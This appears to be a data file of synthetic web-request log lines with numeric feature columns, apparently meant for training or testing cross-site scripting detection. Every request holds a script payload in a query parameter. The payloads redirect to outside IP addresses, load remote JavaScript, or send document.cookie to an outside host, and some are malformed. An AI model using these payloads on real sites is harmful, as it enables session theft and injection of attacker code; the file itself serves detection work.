75,1,200,3028,8,27,16,6,2,GET /?p=<script>%window.open('http://51.36.5.10/964034')3C/script> HTTP/1.1
84,1,200,4237,7,33,17,6,2,GET /?search=<script><script+src="http://160.200.168.70/86203.js=></script> HTTP/1.1
80,1,200,5242,7,28,17,6,2,GET /?p=<script><script+src="http://252.234.210.94/784368.js=></script> HTTP/1.1
77,1,200,3339,7,38,14,5,2,GET /?name=<script>window.location.href="http://1.144.9.56"</script> HTTP/1.1
81,1,200,2924,8,30,16,6,2,GET /?file=<script>%window.open('http://127.184.35.48/605102')3C/script> HTTP/1.1
82,1,200,7313,7,38,14,5,2,GET /?file=<script>window.location.href="http://206.154.153.211"</script> HTTP/1.1
102,1,200,2924,7,54,19,6,2,GET /?name=<script>window.location='http://137.205.127.153/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,7151,7,31,17,6,2,GET /?name=<script><script+src="http://127.128.18.244/500206.js=></script> HTTP/1.1
100,1,200,2769,7,54,19,6,2,GET /?name=<script>window.location='http://156.39.67.186/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,5859,7,54,19,6,2,GET /?file=<script>window.location='http://71.216.107.135/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,2835,7,54,19,6,2,GET /?file=<script>window.location='http://235.34.171.124/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,3529,7,54,19,6,2,GET /?name=<script>window.location='http://39.212.13.234/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,3040,7,54,19,6,2,GET /?file=<script>window.location='http://188.232.100.149/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,5246,7,31,17,6,2,GET /?name=<script><script+src="http://150.2.96.153/365013.js=></script> HTTP/1.1
84,1,200,2155,7,33,17,6,2,GET /?search=<script><script+src="http://125.170.86.59/932046.js=></script> HTTP/1.1
82,1,200,1613,8,30,16,6,2,GET /?file=<script>%window.open('http://107.252.133.33/729381')3C/script> HTTP/1.1
84,1,200,2123,7,31,17,6,2,GET /?file=<script><script+src="http://105.164.120.191/614256.js=></script> HTTP/1.1
80,1,200,2065,7,38,14,5,2,GET /?file=<script>window.location.href="http://107.212.38.74"</script> HTTP/1.1
82,1,200,3468,7,31,17,6,2,GET /?file=<script><script+src="http://55.57.225.180/349512.js=></script> HTTP/1.1
83,1,200,4495,8,32,16,6,2,GET /?search=<script>%window.open('http://71.48.127.114/430033')3C/script> HTTP/1.1
99,1,200,5979,7,54,19,6,2,GET /?name=<script>window.location='http://67.66.23.116/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,5914,7,38,14,5,2,GET /?name=<script>window.location.href="http://150.22.40.56"</script> HTTP/1.1
79,1,200,3439,8,30,16,6,2,GET /?name=<script>%window.open('http://122.20.37.8/494824')3C/script> HTTP/1.1
103,1,200,1433,7,56,19,6,2,GET /?search=<script>window.location='http://12.211.149.185/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,1738,8,30,16,6,2,GET /?file=<script>%window.open('http://28.57.38.208/932188')3C/script> HTTP/1.1
77,1,200,7276,7,28,17,6,2,GET /?p=<script><script+src="http://6.252.30.90/892973.js=></script> HTTP/1.1
81,1,200,2483,7,40,14,5,2,GET /?search=<script>window.location.href="http://117.0.227.78"</script> HTTP/1.1
82,1,200,2012,7,40,14,5,2,GET /?search=<script>window.location.href="http://99.88.101.169"</script> HTTP/1.1
76,1,200,1849,8,27,16,6,2,GET /?p=<script>%window.open('http://145.45.77.23/98027')3C/script> HTTP/1.1
80,1,200,3952,7,28,17,6,2,GET /?p=<script><script+src="http://192.184.98.200/386336.js=></script> HTTP/1.1
85,1,200,4356,8,32,16,6,2,GET /?search=<script>%window.open('http://240.199.224.121/453644')3C/script> HTTP/1.1
101,1,200,4892,7,54,19,6,2,GET /?file=<script>window.location='http://246.133.150.13/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,1130,8,27,16,6,2,GET /?p=<script>%window.open('http://39.236.246.84/121321')3C/script> HTTP/1.1
83,1,200,3488,7,31,17,6,2,GET /?name=<script><script+src="http://41.130.145.142/666296.js=></script> HTTP/1.1
84,1,200,3556,7,33,17,6,2,GET /?search=<script><script+src="http://13.232.119.125/20533.js=></script> HTTP/1.1
79,1,200,2592,8,30,16,6,2,GET /?name=<script>%window.open('http://39.95.41.42/879370')3C/script> HTTP/1.1
81,1,200,5784,8,30,16,6,2,GET /?file=<script>%window.open('http://209.238.21.12/720481')3C/script> HTTP/1.1
83,1,200,6383,7,40,14,5,2,GET /?search=<script>window.location.href="http://157.29.177.126"</script> HTTP/1.1
101,1,200,1774,7,54,19,6,2,GET /?name=<script>window.location='http://213.149.62.100/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,7891,8,30,16,6,2,GET /?name=<script>%window.open('http://140.74.220.177/862865')3C/script> HTTP/1.1
82,1,200,2261,8,30,16,6,2,GET /?file=<script>%window.open('http://85.140.158.255/147249')3C/script> HTTP/1.1
100,1,200,5219,7,54,19,6,2,GET /?file=<script>window.location='http://7.104.247.182/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,4532,8,30,16,6,2,GET /?file=<script>%window.open('http://157.54.67.173/559726')3C/script> HTTP/1.1
81,1,200,5484,8,30,16,6,2,GET /?name=<script>%window.open('http://104.152.200.1/676635')3C/script> HTTP/1.1
82,1,200,5372,8,30,16,6,2,GET /?file=<script>%window.open('http://80.117.108.247/276749')3C/script> HTTP/1.1
78,1,200,7922,7,35,14,5,2,GET /?p=<script>window.location.href="http://242.170.251.32"</script> HTTP/1.1
79,1,200,3985,7,35,14,5,2,GET /?p=<script>window.location.href="http://214.122.211.249"</script> HTTP/1.1
83,1,200,6416,7,31,17,6,2,GET /?name=<script><script+src="http://99.105.106.147/394239.js=></script> HTTP/1.1
80,1,200,1971,8,27,16,6,2,GET /?p=<script>%window.open('http://127.219.166.235/266279')3C/script> HTTP/1.1
81,1,200,2871,8,30,16,6,2,GET /?file=<script>%window.open('http://121.50.171.29/107562')3C/script> HTTP/1.1
80,1,200,4880,8,30,16,6,2,GET /?name=<script>%window.open('http://90.24.34.152/868598')3C/script> HTTP/1.1
98,1,200,3952,7,51,19,6,2,GET /?p=<script>window.location='http://107.96.194.210/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,3743,7,31,17,6,2,GET /?file=<script><script+src="http://122.170.163.61/813855.js=></script> HTTP/1.1
79,1,200,3511,8,27,16,6,2,GET /?p=<script>%window.open('http://116.118.126.62/346018')3C/script> HTTP/1.1
81,1,200,3366,7,31,17,6,2,GET /?file=<script><script+src="http://178.91.32.35/254132.js=></script> HTTP/1.1
83,1,200,1490,7,31,17,6,2,GET /?name=<script><script+src="http://248.39.233.242/816359.js=></script> HTTP/1.1
102,1,200,7730,7,54,19,6,2,GET /?name=<script>window.location='http://164.193.241.175/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,1434,7,28,17,6,2,GET /?p=<script><script+src="http://218.227.2.135/370090.js=></script> HTTP/1.1
81,1,200,4148,7,40,14,5,2,GET /?search=<script>window.location.href="http://9.165.226.69"</script> HTTP/1.1
81,1,200,4590,7,31,17,6,2,GET /?name=<script><script+src="http://236.16.93.60/484324.js=></script> HTTP/1.1
82,1,200,3920,7,38,14,5,2,GET /?name=<script>window.location.href="http://181.203.154.181"</script> HTTP/1.1
102,1,200,6476,7,54,19,6,2,GET /?file=<script>window.location='http://219.178.222.118/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5398,7,31,17,6,2,GET /?name=<script><script+src="http://33.247.212.144/262176.js=></script> HTTP/1.1
79,1,200,3459,8,30,16,6,2,GET /?file=<script>%window.open('http://36.34.66.97/616527')3C/script> HTTP/1.1
82,1,200,2783,7,40,14,5,2,GET /?search=<script>window.location.href="http://99.249.178.55"</script> HTTP/1.1
78,1,200,6811,8,27,16,6,2,GET /?p=<script>%window.open('http://170.97.48.120/111292')3C/script> HTTP/1.1
77,1,200,6906,7,35,14,5,2,GET /?p=<script>window.location.href="http://116.181.3.249"</script> HTTP/1.1
101,1,200,5208,7,54,19,6,2,GET /?file=<script>window.location='http://74.203.201.100/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,5323,7,35,14,5,2,GET /?p=<script>window.location.href="http://106.43.174.42"</script> HTTP/1.1
85,1,200,3801,7,33,17,6,2,GET /?search=<script><script+src="http://107.21.229.225/178050.js=></script> HTTP/1.1
81,1,200,4942,8,30,16,6,2,GET /?name=<script>%window.open('http://53.198.197.20/201464')3C/script> HTTP/1.1
80,1,200,3618,7,28,17,6,2,GET /?p=<script><script+src="http://46.118.238.150/332504.js=></script> HTTP/1.1
84,1,200,6269,7,33,17,6,2,GET /?search=<script><script+src="http://233.3.235.232/857714.js=></script> HTTP/1.1
100,1,200,3369,7,54,19,6,2,GET /?file=<script>window.location='http://184.87.38.209/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,7210,7,35,14,5,2,GET /?p=<script>window.location.href="http://12.250.225.30"</script> HTTP/1.1
79,1,200,3493,7,28,17,6,2,GET /?p=<script><script+src="http://53.215.94.126/767488.js=></script> HTTP/1.1
82,1,200,7022,7,31,17,6,2,GET /?name=<script><script+src="http://239.40.17.226/897309.js=></script> HTTP/1.1
100,1,200,2958,7,54,19,6,2,GET /?file=<script>window.location='http://33.176.30.239/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,4228,7,31,17,6,2,GET /?name=<script><script+src="http://103.62.195.3/935392.js=></script> HTTP/1.1
83,1,200,2284,7,33,17,6,2,GET /?search=<script><script+src="http://44.101.71.73/272402.js=></script> HTTP/1.1
97,1,200,2248,7,51,19,6,2,GET /?p=<script>window.location='http://30.66.112.214/?cookie='+document.cookie</script> HTTP/1.1
